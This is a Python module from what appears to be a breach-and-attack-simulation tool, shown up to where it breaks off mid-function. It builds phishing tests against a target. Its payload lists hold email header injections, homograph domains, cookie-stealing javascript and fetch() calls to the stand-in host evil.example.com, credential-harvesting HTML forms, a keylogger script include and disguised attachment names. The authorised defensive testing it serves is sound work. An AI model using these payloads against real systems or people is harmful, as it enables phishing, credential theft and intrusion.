"""
Phishing Campaign Simulation and Detection Testing module.

Simulates phishing attack vectors to assess an organization's resilience
against email-based social engineering. Tests mail server configuration,
email authentication (SPF/DKIM/DMARC), homograph domain detection,
URL obfuscation handling, HTML email injection, credential harvesting
page detection, tracking pixel identification, and attachment filtering.

For AUTHORIZED red team engagements only.

MITRE ATT&CK:
  T1566     - Phishing
  T1566.001 - Phishing: Spearphishing Attachment
  T1566.002 - Phishing: Spearphishing Link
"""

from __future__ import annotations

import re
import uuid
from typing import Any

from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus


# ---------------------------------------------------------------------------
# 1. Email Header Injection Tests (35 payloads)
# ---------------------------------------------------------------------------
EMAIL_HEADER_INJECTION_PAYLOADS = [
    # CRLF-based header injection via From field
    "HDR_INJECT:From:attacker@evil.example.com%0ACc:exfil@evil.example.com",
    "HDR_INJECT:From:attacker@evil.example.com%0D%0ABcc:exfil@evil.example.com",
    "HDR_INJECT:From:attacker@evil.example.com\r\nCc:exfil@evil.example.com",
    "HDR_INJECT:From:attacker@evil.example.com\nBcc:exfil@evil.example.com",
    # Subject injection
    "HDR_INJECT:Subject:Normal%0ASubject:URGENT - Password Reset Required",
    "HDR_INJECT:Subject:Test%0D%0ASubject:Invoice #38291 - Action Required",
    "HDR_INJECT:Subject:Hello%0ASubject:=?UTF-8?B?VXJnZW50IFNlY3VyaXR5IEFsZXJ0?=",
    "HDR_INJECT:Subject:Benign%0AX-Priority:1%0AImportance:high",
    # Reply-To manipulation
    "HDR_INJECT:Reply-To:ceo@evil.example.com",
    "HDR_INJECT:From:legit@company.example.com%0AReply-To:attacker@evil.example.com",
    "HDR_INJECT:From:noreply@company.example.com%0AReturn-Path:attacker@evil.example.com",
    "HDR_INJECT:From:hr@company.example.com%0ASender:attacker@evil.example.com",
    # Content-Type manipulation
    "HDR_INJECT:Content-Type:multipart/mixed;boundary=evil_boundary",
    "HDR_INJECT:From:test@test.com%0AContent-Type:text/html%0A%0A<h1>Phishing</h1>",
    "HDR_INJECT:From:test@test.com%0AMIME-Version:1.0%0AContent-Type:multipart/alternative;boundary=bas",
    # X-Header injection for filter evasion
    "HDR_INJECT:X-Mailer:Microsoft Outlook 16.0",
    "HDR_INJECT:X-Originating-IP:10.0.0.1",
    "HDR_INJECT:From:test@test.com%0AX-Spam-Status:No",
    "HDR_INJECT:From:test@test.com%0AX-Spam-Flag:NO",
    "HDR_INJECT:From:test@test.com%0AAuthentication-Results:spf=pass",
    # Received header injection
    "HDR_INJECT:From:test@test.com%0AReceived:from mail.company.example.com (EHLO mail.company.example.com)",
    "HDR_INJECT:From:test@test.com%0AReceived:from internal.example.com [10.0.0.5]",
    # Multiple header chain injection
    "HDR_INJECT:From:ceo@company.example.com%0AReply-To:attacker@evil.example.com%0AX-Priority:1",
    "HDR_INJECT:From:helpdesk@company.example.com%0ACc:attacker@evil.example.com%0ABcc:exfil@evil.example.com",
    # Null byte injection
    "HDR_INJECT:From:legit@company.example.com%00attacker@evil.example.com",
    "HDR_INJECT:Subject:Normal%00%0ASubject:Injected",
    # Encoded header injection
    "HDR_INJECT:From:test@test.com%0a%43%63%3a%20attacker@evil.example.com",
    "HDR_INJECT:From:test@test.com%0a%42%63%63%3a%20exfil@evil.example.com",
    # Double encoding
    "HDR_INJECT:From:test@test.com%250ACc:attacker@evil.example.com",
    "HDR_INJECT:From:test@test.com%250D%250ABcc:exfil@evil.example.com",
    # Tab-based injection
    "HDR_INJECT:From:test@test.com%09%0ACc:attacker@evil.example.com",
    # UTF-8 encoded header
    "HDR_INJECT:From:=?UTF-8?Q?=61=74=74=61=63=6B=65=72?=@evil.example.com",
    # Long header folding attack
    "HDR_INJECT:From:test@test.com " + "A" * 200 + "%0ACc:attacker@evil.example.com",
    # Bare LF injection
    "HDR_INJECT:From:test@test.com%0aCc:attacker@evil.example.com",
    "HDR_INJECT:From:test@test.com%0dCc:attacker@evil.example.com",
]

# ---------------------------------------------------------------------------
# 2. SPF/DKIM/DMARC Validation Checks (30 payloads)
# ---------------------------------------------------------------------------
EMAIL_AUTH_VALIDATION_PAYLOADS = [
    # SPF record checks
    "EMAIL_AUTH:spf_txt_query:v=spf1",
    "EMAIL_AUTH:spf_all_pass:v=spf1 +all",
    "EMAIL_AUTH:spf_all_softfail:v=spf1 ~all",
    "EMAIL_AUTH:spf_all_neutral:v=spf1 ?all",
    "EMAIL_AUTH:spf_no_record:NO_SPF",
    "EMAIL_AUTH:spf_too_many_lookups:v=spf1 include:a include:b include:c include:d include:e include:f include:g include:h include:i include:j include:k -all",
    "EMAIL_AUTH:spf_redirect_chain:v=spf1 redirect=_spf.external.example.com",
    "EMAIL_AUTH:spf_macro_expansion:v=spf1 exists:%{i}._spf.example.com -all",
    "EMAIL_AUTH:spf_ip4_wide:v=spf1 ip4:0.0.0.0/0 -all",
    "EMAIL_AUTH:spf_include_wildcard:v=spf1 include:*.example.com -all",
    # DKIM checks
    "EMAIL_AUTH:dkim_missing:NO_DKIM",
    "EMAIL_AUTH:dkim_weak_key:DKIM_RSA_512",
    "EMAIL_AUTH:dkim_sha1:DKIM_SHA1_HASH",
    "EMAIL_AUTH:dkim_testing_mode:DKIM_t=y",
    "EMAIL_AUTH:dkim_subdomain:DKIM_SUBDOMAIN_CHECK",
    "EMAIL_AUTH:dkim_key_rotation:DKIM_SELECTOR_ENUM",
    "EMAIL_AUTH:dkim_body_length:DKIM_l=_TAG",
    "EMAIL_AUTH:dkim_multiple_selectors:selector1,selector2,google,default",
    # DMARC checks
    "EMAIL_AUTH:dmarc_missing:NO_DMARC",
    "EMAIL_AUTH:dmarc_none_policy:v=DMARC1;p=none",
    "EMAIL_AUTH:dmarc_quarantine:v=DMARC1;p=quarantine",
    "EMAIL_AUTH:dmarc_reject:v=DMARC1;p=reject",
    "EMAIL_AUTH:dmarc_no_rua:v=DMARC1;p=none;sp=none",
    "EMAIL_AUTH:dmarc_pct_low:v=DMARC1;p=reject;pct=10",
    "EMAIL_AUTH:dmarc_subdomain_none:v=DMARC1;p=reject;sp=none",
    "EMAIL_AUTH:dmarc_relaxed_alignment:v=DMARC1;p=reject;aspf=r;adkim=r",
    "EMAIL_AUTH:dmarc_external_rua:v=DMARC1;p=none;rua=mailto:reports@external.example.com",
    # Combined authentication checks
    "EMAIL_AUTH:arc_chain_validation:ARC_CHECK",
    "EMAIL_AUTH:bimi_record_check:BIMI_TXT",
    "EMAIL_AUTH:mta_sts_policy:MTA_STS_CHECK",
]

# ---------------------------------------------------------------------------
# 3. Homograph / IDN Domain Detection (35 payloads)
# ---------------------------------------------------------------------------
HOMOGRAPH_DOMAIN_PAYLOADS = [
    # Cyrillic homoglyphs
    "HOMOGRAPH:xn--80ak6aa92e.com",  # apple.com with Cyrillic a
    "HOMOGRAPH:xn--e1awd7f.com",  # epic.com with Cyrillic chars
    "HOMOGRAPH:xn--80a1acn.com",  # bank with Cyrillic
    "HOMOGRAPH:xn--pple-43d.com",  # apple with Cyrillic a
    "HOMOGRAPH:xn--ggle-55da.com",  # google with Cyrillic oo
    "HOMOGRAPH:xn--mirzon-3ve.com",  # amazon with Cyrillic a
    "HOMOGRAPH:xn--icrosoft-y7a.com",  # microsoft with Cyrillic m
    "HOMOGRAPH:xn--pypal-4ve.com",  # paypal with Cyrillic a
    # Greek homoglyphs
    "HOMOGRAPH:xn--nflx-zsa.com",  # netflix with Greek chars
    "HOMOGRAPH:xn--fcebook-8va.com",  # facebook with Greek a
    # Mixed script attacks
    "HOMOGRAPH:xn--80aa0cbo65f.com",  # mixed Cyrillic-Latin
    "HOMOGRAPH:xn--n1aae2c.com",  # mixed script domain
    # Right-to-left override
    "HOMOGRAPH:example\u202ecom.evil.com",
    "HOMOGRAPH:secure-login\u200b.evil.example.com",
    # Zero-width characters in domain
    "HOMOGRAPH:exam\u200bple.com",
    "HOMOGRAPH:g\u200bogle.com",
    "HOMOGRAPH:micro\u200bsoft.com",
    "HOMOGRAPH:pay\u200bpal.com",
    # Combining characters
    "HOMOGRAPH:goo\u0307gle.com",
    "HOMOGRAPH:amaz\u0323on.com",
    # Full-width characters
    "HOMOGRAPH:\uff47\uff4f\uff4f\uff47\uff4c\uff45.com",
    "HOMOGRAPH:\uff41\uff50\uff50\uff4c\uff45.com",
    # Typosquatting variations
    "HOMOGRAPH:gooogle.com",
    "HOMOGRAPH:gogle.com",
    "HOMOGRAPH:googel.com",
    "HOMOGRAPH:goggle.com",
    "HOMOGRAPH:microsft.com",
    "HOMOGRAPH:microsfot.com",
    "HOMOGRAPH:paypa1.com",
    "HOMOGRAPH:paypai.com",
    # Subdomain impersonation
    "HOMOGRAPH:login.company.evil.example.com",
    "HOMOGRAPH:company.com.evil.example.com",
    "HOMOGRAPH:secure.company.com.attacker.example.com",
    # TLD swap
    "HOMOGRAPH:company.co",
    "HOMOGRAPH:company.cm",
]

# ---------------------------------------------------------------------------
# 4. URL Obfuscation Patterns (40 payloads)
# ---------------------------------------------------------------------------
URL_OBFUSCATION_PAYLOADS = [
    # URL shortener abuse
    "URL_OBFUSC:https://bit.ly/3xF4kE",
    "URL_OBFUSC:https://tinyurl.com/bas-test-phish",
    "URL_OBFUSC:https://t.co/fakeshort123",
    "URL_OBFUSC:https://goo.gl/abc123",
    "URL_OBFUSC:https://ow.ly/test4321",
    "URL_OBFUSC:https://is.gd/testlink",
    "URL_OBFUSC:https://rebrand.ly/phish-sim",
    # Data URI phishing
    "URL_OBFUSC:data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "URL_OBFUSC:data:text/html,<h1>Login</h1><form><input name=user><input type=password name=pass></form>",
    "URL_OBFUSC:data:text/html;charset=utf-8;base64,PGZvcm0gYWN0aW9uPSJodHRwczovL2V2aWwuZXhhbXBsZS5jb20iPg==",
    # JavaScript URI
    "URL_OBFUSC:javascript:void(document.location='https://evil.example.com/'+document.cookie)",
    "URL_OBFUSC:javascript:fetch('https://evil.example.com/steal?c='+document.cookie)",
    # IP address obfuscation
    "URL_OBFUSC:http://0x7f000001/phish",
    "URL_OBFUSC:http://2130706433/phish",
    "URL_OBFUSC:http://0177.0.0.1/phish",
    "URL_OBFUSC:http://[::1]/phish",
    "URL_OBFUSC:http://127.0.0.1.nip.io/phish",
    # Punycode URLs
    "URL_OBFUSC:https://xn--80ak6aa92e.com/login",
    "URL_OBFUSC:https://xn--pple-43d.com/account",
    "URL_OBFUSC:https://xn--ggle-55da.com/signin",
    # URL with credentials
    "URL_OBFUSC:https://admin@evil.example.com",
    "URL_OBFUSC:https://company.com@evil.example.com",
    "URL_OBFUSC:https://secure.company.com@evil.example.com/login",
    "URL_OBFUSC:https://user:pass@evil.example.com",
    # Double encoding
    "URL_OBFUSC:https://evil.example.com/%252e%252e/admin",
    "URL_OBFUSC:https://evil.example.com/%2568ttp://company.com",
    # URL parameter injection
    "URL_OBFUSC:https://company.com/redirect?url=https://evil.example.com",
    "URL_OBFUSC:https://company.com/goto?next=https://evil.example.com/phish",
    "URL_OBFUSC:https://company.com/login?return_to=https://evil.example.com",
    # Unicode normalization attacks
    "URL_OBFUSC:https://evil.example.com/\u2025/admin",
    "URL_OBFUSC:https://evil.example.com/\uff0e\uff0e/admin",
    # URL fragment abuse
    "URL_OBFUSC:https://company.com#@evil.example.com",
    "URL_OBFUSC:https://company.com/page#javascript:alert(1)",
    # Whitespace insertion
    "URL_OBFUSC:https://evil .example.com/login",
    "URL_OBFUSC:https://evil\t.example.com/login",
    # Protocol-relative URL
    "URL_OBFUSC://evil.example.com/phish",
    # Backslash confusion
    "URL_OBFUSC:https://evil.example.com\\@company.com",
    "URL_OBFUSC:https://company.com\\..\\evil.example.com",
    # Open redirect chains
    "URL_OBFUSC:https://company.com/redirect?url=https://short.url/x?r=https://evil.example.com",
    "URL_OBFUSC:https://google.com/url?q=https://evil.example.com",
]

# ---------------------------------------------------------------------------
# 5. HTML Email Injection (30 payloads)
# ---------------------------------------------------------------------------
HTML_EMAIL_INJECTION_PAYLOADS = [
    # Form injection in HTML email
    "HTML_INJECT:<form action='https://evil.example.com/harvest' method='POST'><input name='user' placeholder='Username'><input type='password' name='pass'><button>Login</button></form>",
    "HTML_INJECT:<form action='https://evil.example.com/cred'><table><tr><td>Email:</td><td><input name='email'></td></tr><tr><td>Password:</td><td><input type='password' name='pw'></td></tr></table><input type='submit'></form>",
    # Iframe injection
    "HTML_INJECT:<iframe src='https://evil.example.com/phish' style='width:100%;height:600px;border:0'></iframe>",
    "HTML_INJECT:<iframe srcdoc='<form action=https://evil.example.com><input name=pw type=password><button>Verify</button></form>'></iframe>",
    # Script injection in email
    "HTML_INJECT:<script>document.location='https://evil.example.com/steal?c='+document.cookie</script>",
    "HTML_INJECT:<script src='https://evil.example.com/keylogger.js'></script>",
    "HTML_INJECT:<img src=x onerror='fetch(\"https://evil.example.com/ping\")'>",
    # SVG-based attacks
    "HTML_INJECT:<svg onload='document.location=\"https://evil.example.com\"'></svg>",
    "HTML_INJECT:<svg><use href='https://evil.example.com/malicious.svg#exploit'></use></svg>",
    # CSS-based exfiltration
    "HTML_INJECT:<style>input[value^='a']{background:url('https://evil.example.com/leak?v=a')}</style>",
    "HTML_INJECT:<style>@import url('https://evil.example.com/exfil.css');</style>",
    "HTML_INJECT:<link rel='stylesheet' href='https://evil.example.com/phish.css'>",
    # Base tag hijacking
    "HTML_INJECT:<base href='https://evil.example.com/'>",
    # Meta refresh redirect
    "HTML_INJECT:<meta http-equiv='refresh' content='0;url=https://evil.example.com/phish'>",
    "HTML_INJECT:<meta http-equiv='refresh' content='3;url=https://evil.example.com/login'>",
    # Object/embed injection
    "HTML_INJECT:<object data='https://evil.example.com/payload.swf'></object>",
    "HTML_INJECT:<embed src='https://evil.example.com/exploit.pdf'>",
    # Link-based attacks
    "HTML_INJECT:<a href='https://evil.example.com' style='position:absolute;width:100%;height:100%;top:0;left:0;z-index:999'></a>",
    "HTML_INJECT:<a href='https://evil.example.com/login'>Click here to verify your account</a>",
    # Invisible pixel tracking
    "HTML_INJECT:<img src='https://evil.example.com/track?id=target123' width='1' height='1'>",
    "HTML_INJECT:<img src='https://evil.example.com/pixel.gif' style='display:none'>",
    # Background image exfiltration
    "HTML_INJECT:<div style='background:url(https://evil.example.com/track)'></div>",
    "HTML_INJECT:<table background='https://evil.example.com/track.gif'><tr><td>Content</td></tr></table>",
    # Event handler attacks
    "HTML_INJECT:<body onload='window.open(\"https://evil.example.com\")'>",
    "HTML_INJECT:<marquee onstart='document.location=\"https://evil.example.com\"'>Loading</marquee>",
    # Content spoofing via HTML
    "HTML_INJECT:<div style='font-family:Arial;font-size:14px'><p>Dear User,</p><p>Your account has been compromised. <a href='https://evil.example.com/reset'>Reset your password immediately</a>.</p><p>IT Security Team</p></div>",
    # Input capture via event handlers
    "HTML_INJECT:<input onfocus='this.form.action=\"https://evil.example.com/steal\"' autofocus>",
    "HTML_INJECT:<textarea onkeyup='fetch(\"https://evil.example.com/log?k=\"+this.value)'></textarea>",
    # Data exfiltration via image src
    "HTML_INJECT:<img src='https://evil.example.com/collect?ref='+window.location.href>",
    "HTML_INJECT:<picture><source srcset='https://evil.example.com/track.webp'><img src='https://evil.example.com/track.png'></picture>",
]

# ---------------------------------------------------------------------------
# 6. Credential Harvesting Page Detection (30 payloads)
# ---------------------------------------------------------------------------
CREDENTIAL_HARVEST_PAYLOADS = [
    # Login page clone detection paths
    "CRED_HARVEST:/phishing-test/login",
    "CRED_HARVEST:/verify-account",
    "CRED_HARVEST:/secure-login",
    "CRED_HARVEST:/account-verification",
    "CRED_HARVEST:/password-update",
    "CRED_HARVEST:/security-alert",
    "CRED_HARVEST:/confirm-identity",
    "CRED_HARVEST:/session-expired",
    "CRED_HARVEST:/reactivate-account",
    "CRED_HARVEST:/unlock-account",
    # Form action analysis
    "CRED_HARVEST:/login?redirect=https://evil.example.com",
    "CRED_HARVEST:/auth?callback=https://evil.example.com/collect",
    "CRED_HARVEST:/signin?return_url=https://evil.example.com",
    # Credential input field scanning
    "CRED_HARVEST:SCAN_FORM_ACTION_EXTERNAL",
    "CRED_HARVEST:SCAN_HIDDEN_IFRAME",
    "CRED_HARVEST:SCAN_INVISIBLE_FORM",
    "CRED_HARVEST:SCAN_AUTOCOMPLETE_ON",
    "CRED_HARVEST:SCAN_NO_HTTPS",
    # OAuth/SSO phishing simulation
    "CRED_HARVEST:/oauth/fake-consent",
    "CRED_HARVEST:/saml/spoofed-idp",
    "CRED_HARVEST:/auth/fake-mfa-prompt",
    "CRED_HARVEST:/auth/device-code-phish",
    # Brand impersonation detection
    "CRED_HARVEST:DETECT_BRAND_MISMATCH",
    "CRED_HARVEST:DETECT_FAVICON_MISMATCH",
    "CRED_HARVEST:DETECT_CERT_MISMATCH",
    "CRED_HARVEST:DETECT_DOMAIN_AGE",
    # Post-credential-capture behavior
    "CRED_HARVEST:REDIRECT_AFTER_SUBMIT",
    "CRED_HARVEST:ERROR_AFTER_SUBMIT",
    "CRED_HARVEST:PROXY_TO_LEGITIMATE",
    "CRED_HARVEST:TWO_FACTOR_INTERCEPT",
]

# ---------------------------------------------------------------------------
# 7. Attachment Type Bypass (30 payloads)
# ---------------------------------------------------------------------------
ATTACHMENT_BYPASS_PAYLOADS = [
    # Double extension attacks
    "ATTACH_BYPASS:document.pdf.exe",
    "ATTACH_BYPASS:invoice.xlsx.scr",
    "ATTACH_BYPASS:report.docx.bat",
    "ATTACH_BYPASS:photo.jpg.exe",
    "ATTACH_BYPASS:readme.txt.pif",
    "ATTACH_BYPASS:update.pdf.com",
    "ATTACH_BYPASS:contract.doc.vbs",
    "ATTACH_BYPASS:resume.pdf.ps1",
    # MIME type mismatch
    "ATTACH_BYPASS:MIME:application/pdf:malware.exe",
    "ATTACH_BYPASS:MIME:image/jpeg:payload.exe",
    "ATTACH_BYPASS:MIME:text/plain:backdoor.bat",
    "ATTACH_BYPASS:MIME:application/msword:trojan.scr",
    "ATTACH_BYPASS:MIME:application/zip:dropper.exe",
    # Right-to-left override in filename
    "ATTACH_BYPASS:report\u202eexe.pdf",
    "ATTACH_BYPASS:invoice\u202etab.doc",
    "ATTACH_BYPASS:photo\u202eexe.jpg",
    # Archive-based bypass
    "ATTACH_BYPASS:payload.zip",
    "ATTACH_BYPASS:payload.7z",
    "ATTACH_BYPASS:payload.rar",
    "ATTACH_BYPASS:payload.tar.gz",
    "ATTACH_BYPASS:payload.iso",
    "ATTACH_BYPASS:payload.img",
    # Macro-enabled documents
    "ATTACH_BYPASS:document.docm",
    "ATTACH_BYPASS:spreadsheet.xlsm",
    "ATTACH_BYPASS:presentation.pptm",
    "ATTACH_BYPASS:template.dotm",
    # Uncommon executable extensions
    "ATTACH_BYPASS:payload.hta",
    "ATTACH_BYPASS:payload.wsh",
    "ATTACH_BYPASS:payload.wsf",
    "ATTACH_BYPASS:payload.sct",
]

# ---------------------------------------------------------------------------
# 8. Mail Relay and Spoofing Tests (30 payloads)
# ---------------------------------------------------------------------------
MAIL_RELAY_PAYLOADS = [
    # Open relay test paths
    "MAIL_RELAY:/api/mail/send",
    "MAIL_RELAY:/api/email/send",
    "MAIL_RELAY:/api/v1/messages",
    "MAIL_RELAY:/api/v2/mail/send",
    "MAIL_RELAY:/smtp/relay",
    "MAIL_RELAY:/mail/relay",
    "MAIL_RELAY:/sendmail",
    "MAIL_RELAY:/cgi-bin/mail",
    "MAIL_RELAY:/cgi-bin/formmail.pl",
    "MAIL_RELAY:/formmail",
    # Mail configuration exposure
    "MAIL_RELAY:/.env",
    "MAIL_RELAY:/config/mail.yml",
    "MAIL_RELAY:/config/smtp.json",
    "MAIL_RELAY:/phpinfo.php",
    "MAIL_RELAY:/server-info",
    # Email spoofing indicator headers
    "SPOOF_INDICATOR:X-Original-From:spoofed@evil.example.com",
    "SPOOF_INDICATOR:X-Sender:attacker@evil.example.com",
    "SPOOF_INDICATOR:Resent-From:spoofed@evil.example.com",
    "SPOOF_INDICATOR:X-Google-DKIM:fail",
    "SPOOF_INDICATOR:Authentication-Results:spf=fail",
    "SPOOF_INDICATOR:Authentication-Results:dkim=fail",
    "SPOOF_INDICATOR:Authentication-Results:dmarc=fail",
    "SPOOF_INDICATOR:ARC-Authentication-Results:arc=fail",
    # Email tracking pixel detection
    "TRACK_PIXEL:/pixel.gif?uid=target_user_001",
    "TRACK_PIXEL:/track/open?id=campaign_123",
    "TRACK_PIXEL:/beacon?e=target@company.example.com",
    "TRACK_PIXEL:/1x1.png?track=1",
    "TRACK_PIXEL:/api/email/read?msg_id=12345",
    "TRACK_PIXEL:/t.gif?token=abc123",
    "TRACK_PIXEL:/open?u=user&c=campaign&t=timestamp",
]

# ---------------------------------------------------------------------------
# Patterns for response analysis
# ---------------------------------------------------------------------------
PHISHING_BLOCKED_INDICATORS = [
    "phishing detected", "suspicious link", "malicious url",
    "blocked by security", "url reputation", "unsafe link",
    "phishing attempt", "spam detected", "email rejected",
    "message quarantined", "content filtered", "policy violation",
    "header injection", "invalid header", "crlf detected",
]

MAIL_SERVER_INFO_INDICATORS = [
    "smtp", "postfix", "exim", "sendmail", "exchange",
    "dovecot", "zimbra", "mailer-daemon", "mail delivery",
    "mx record", "relay access", "mail server", "qmail",
    "phpmailer", "swiftmailer", "nodemailer", "mailgun",
    "sendgrid", "ses", "amazon ses", "sparkpost",
]

CREDENTIAL_FORM_PATTERNS = [
    r'<form[^>]*action=["\']([^"\']*)["\']',
    r'<input[^>]*type=["\']password["\']',
    r'<input[^>]*name=["\'](?:username|email|user|login|password|passwd)["\']',
    r'autocomplete=["\'](?:username|current-password|new-password)["\']',
]


class PhishingSimModule(BaseAttackModule):
    """
    Phishing campaign simulation and detection testing module.

    Assesses organizational resilience to phishing attacks by testing:
    - Email header injection via web forms and APIs
    - SPF/DKIM/DMARC configuration and enforcement
    - Homograph and IDN domain detection capabilities
    - URL obfuscation handling (shorteners, punycode, data URIs)
    - HTML email injection and rendering security
    - Credential harvesting page detection
    - Attachment filtering effectiveness
    - Mail relay configuration and spoofing indicators

    Requires AuthorizationLevel.FULL -- active phishing simulation tests.
    """

    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(
            name="phishing_sim",
            description=(
                "Phishing campaign simulation - email header injection, "
                "SPF/DKIM/DMARC validation, homograph detection, URL obfuscation, "
                "HTML injection, credential harvesting, attachment bypass, mail relay"
            ),
            category="social_engineering",
            mitre_technique_ids=["T1566", "T1566.001", "T1566.002"],
            mitre_technique_names=[
                "Phishing",
                "Phishing: Spearphishing Attachment",
                "Phishing: Spearphishing Link",
            ],
            auth_level_required=AuthorizationLevel.FULL,
            owasp_category="A07:2021 - Identification and Authentication Failures",
            cwe_ids=["CWE-20", "CWE-93", "CWE-601"],
            tags=[
                "phishing", "social_engineering", "email", "spf", "dkim", "dmarc",
                "homograph", "url_obfuscation", "credential_harvest", "mail_relay",
            ],
        )

    # ------------------------------------------------------------------
    # Payload generation
    # ------------------------------------------------------------------

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        """
        Return 230+ payloads across all phishing simulation categories.

        Options:
            categories (list[str]): limit to specific categories
        """
        if self._payload_db:
            db_payloads = await self._payload_db.get_payloads("phishing_sim", limit=300)
            if db_payloads:
                return db_payloads

        selected = options.get("categories", [])
        payloads: list[str] = []

        if not selected or "header_injection" in selected:
            payloads.extend(EMAIL_HEADER_INJECTION_PAYLOADS)

        if not selected or "email_auth" in selected:
            payloads.extend(EMAIL_AUTH_VALIDATION_PAYLOADS)

        if not selected or "homograph" in selected:
            payloads.extend(HOMOGRAPH_DOMAIN_PAYLOADS)

        if not selected or "url_obfuscation" in selected:
            payloads.extend(URL_OBFUSCATION_PAYLOADS)

        if not selected or "html_injection" in selected:
            payloads.extend(HTML_EMAIL_INJECTION_PAYLOADS)

        if not selected or "credential_harvest" in selected:
            payloads.extend(CREDENTIAL_HARVEST_PAYLOADS)

        if not selected or "attachment_bypass" in selected:
            payloads.extend(ATTACHMENT_BYPASS_PAYLOADS)

        if not selected or "mail_relay" in selected:
            payloads.extend(MAIL_RELAY_PAYLOADS)

        return payloads

    # ------------------------------------------------------------------
    # Request building
    # ------------------------------------------------------------------

    def _build_requests(
        self, target: str, payloads: list[str], options: dict[str, Any],
    ) -> list[AttackRequest]:
        """
        Construct requests from phishing simulation payloads.

        Routes each payload category to the appropriate request builder.
        """
        requests: list[AttackRequest] = []
        auth_headers = options.get("auth_headers", {})

        for payload in payloads:
            parts = payload.split(":", 1)
            category = parts[0] if len(parts) == 2 else "UNKNOWN"
            value = parts[1] if len(parts) == 2 else payload
            req_id = str(uuid.uuid4())[:8]

            if category == "HDR_INJECT":
                requests.append(self._build_header_inject_request(
                    req_id, target, value, payload, auth_headers, options,
                ))

            elif category == "EMAIL_AUTH":
                requests.append(self._build_email_auth_request(
                    req_id, target, value, payload, auth_headers,
                ))

            elif category == "HOMOGRAPH":
                requests.append(self._build_homograph_request(
                    req_id, target, value, payload,
                ))

            elif category == "URL_OBFUSC":
                requests.append(self._build_url_obfusc_request(
                    req_id, target, value, payload, auth_headers,
                ))

            elif category == "HTML_INJECT":
                requests.append(self._build_html_inject_request(
                    req_id, target, value, payload, auth_headers, options,
                ))

            elif category == "CRED_HARVEST":
                requests.append(self._build_cred_harvest_request(
                    req_id, target, value, payload, auth_headers,
                ))

            elif category in ("ATTACH_BYPASS",):
                requests.append(self._build_attach_bypass_request(
                    req_id, target, value, payload, auth_headers,
                ))

            elif category in ("MAIL_RELAY", "SPOOF_INDICATOR", "TRACK_PIXEL"):
                requests.append(self._build_mail_relay_request(
                    req_id, target, value, payload, category, auth_headers,
                ))

            else:
                requests.append(AttackRequest(
                    request_id=f"phish-{req_id}",
                    target=target,
                    method="GET",
                    path="/",
                    headers={
                        **auth_headers,
                        "X-BAS-Attack-Type": category,
                        "X-BAS-Payload": payload,
                    },
                ))

        return requests

    # --- Individual request builders -----------------------------------------------

    def _build_header_inject_request(
        self, req_id: str, target: str, value: str, payload: str,
        auth_headers: dict[str, str], options: dict[str, Any],
    ) -> AttackRequest:
        form_path = options.get("mail_form_path", "/api/contact")
        return AttackRequest(
            request_id=f"phish-hdr-{req_id}",
            target=target,
            method="POST",
            path=form_path,
            body=f"from={value}&subject=BAS+Phishing+Test&body=Security+test+message",
            content_type="application/x-www-form-urlencoded",
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": "HDR_INJECT",
                "X-BAS-Payload": payload,
            },
            timeout=options.get("timeout", 15.0),
        )

    def _build_email_auth_request(
        self, req_id: str, target: str, value: str, payload: str,
        auth_headers: dict[str, str],
    ) -> AttackRequest:
        """Check email authentication records via well-known endpoints."""
        check_type = value.split(":")[0] if ":" in value else value
        if check_type.startswith("spf"):
            path = "/.well-known/spf"
        elif check_type.startswith("dkim"):
            path = "/.well-known/dkim"
        elif check_type.startswith("dmarc"):
            path = "/.well-known/dmarc"
        elif check_type.startswith("mta_sts"):
            path = "/.well-known/mta-sts.txt"
        elif check_type.startswith("bimi"):
            path = "/.well-known/bimi"
        else:
            path = "/.well-known/security.txt"
        return AttackRequest(
            request_id=f"phish-auth-{req_id}",
            target=target,
            method="GET",
            path=path,
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": "EMAIL_AUTH",
                "X-BAS-Payload": payload,
            },
        )

    def _build_homograph_request(
        self, req_id: str, target: str, value: str, payload: str,
    ) -> AttackRequest:
        """Test homograph domain detection by including it in headers."""
        return AttackRequest(
            request_id=f"phish-idn-{req_id}",
            target=target,
            method="GET",
            path="/",
            headers={
                "X-BAS-Attack-Type": "HOMOGRAPH",
                "X-BAS-Payload": payload,
                "X-BAS-Test-Domain": value,
                "Referer": f"https://{value}/",
            },
        )

    def _build_url_obfusc_request(
        self, req_id: str, target: str, value: str, payload: str,
        auth_headers: dict[str, str],
    ) -> AttackRequest:
        """Test URL obfuscation handling via link submission."""
        return AttackRequest(
            request_id=f"phish-url-{req_id}",
            target=target,
            method="POST",
            path="/api/link-check",
            body=f"url={value}",
            content_type="application/x-www-form-urlencoded",
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": "URL_OBFUSC",
                "X-BAS-Payload": payload,
            },
        )

    def _build_html_inject_request(
        self, req_id: str, target: str, value: str, payload: str,
        auth_headers: dict[str, str], options: dict[str, Any],
    ) -> AttackRequest:
        """Submit HTML content to mail/messaging endpoints."""
        form_path = options.get("mail_form_path", "/api/contact")
        return AttackRequest(
            request_id=f"phish-html-{req_id}",
            target=target,
            method="POST",
            path=form_path,
            body=f"from=test@bas-test.example.com&subject=BAS+Test&body={value}",
            content_type="application/x-www-form-urlencoded",
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": "HTML_INJECT",
                "X-BAS-Payload": payload,
            },
            timeout=options.get("timeout", 15.0),
        )

    def _build_cred_harvest_request(
        self, req_id: str, target: str, value: str, payload: str,
        auth_headers: dict[str, str],
    ) -> AttackRequest:
        """Probe for credential harvesting pages or scan existing login forms."""
        if value.startswith("/"):
            return AttackRequest(
                request_id=f"phish-cred-{req_id}",
                target=target,
                method="GET",
                path=value,
                headers={
                    **auth_headers,
                    "X-BAS-Attack-Type": "CRED_HARVEST",
                    "X-BAS-Payload": payload,
                    "User-Agent": (
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                        "AppleWebKit/537.36 (KHTML, like Gecko) "
                        "Chrome/120.0.0.0 Safari/537.36"
                    ),
                },
                follow_redirects=True,
            )
        return AttackRequest(
            request_id=f"phish-cred-{req_id}",
            target=target,
            method="GET",
            path="/login",
            headers={
                **auth_headers,
                "X-BAS-Attack-Type": "CRED_HARVEST",
                "X-BAS-Payload": payload,
